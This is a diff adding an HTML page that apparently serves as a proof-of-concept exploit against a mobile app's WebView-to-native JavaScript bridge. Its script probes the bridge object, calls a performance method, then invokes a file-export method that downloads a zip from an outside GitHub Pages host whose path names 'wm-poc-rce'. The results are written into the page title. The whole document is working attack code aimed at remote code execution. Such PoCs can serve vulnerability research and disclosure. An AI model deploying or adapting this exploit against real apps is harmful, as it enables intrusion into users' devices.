@@ -1,0 +1,35 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P134TPL</title></head>
+<body><h1>P134TPL</h1>
+<script>
+document.title='P134TPL:'+location.host+':'+location.protocol;
+window.__t=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P134TCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__t',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P134TPL-NOJS:'+location.host;
+  }
+}
+if(!window.JSCallJavaMgr){document.title='P134TPL-NOMGR:'+location.host;}
+else{
+  setTimeout(function(){
+    document.title='P134TPL-H2';
+    c('H2','CommonPlugin','GetPerformance',{});
+  }, 800);
+  setTimeout(function(){
+    document.title='P134TPL-EF';
+    c('EF','CommonPlugin','ExportFile',{
+      fileName:'p134tpl.bin',
+      contentType:'application/octet-stream',
+      url:'https://gitwhs.github.io/wm-poc-rce/p97avatar.zip'
+    });
+  }, 4800);
+}
+</script>
+</body></html>
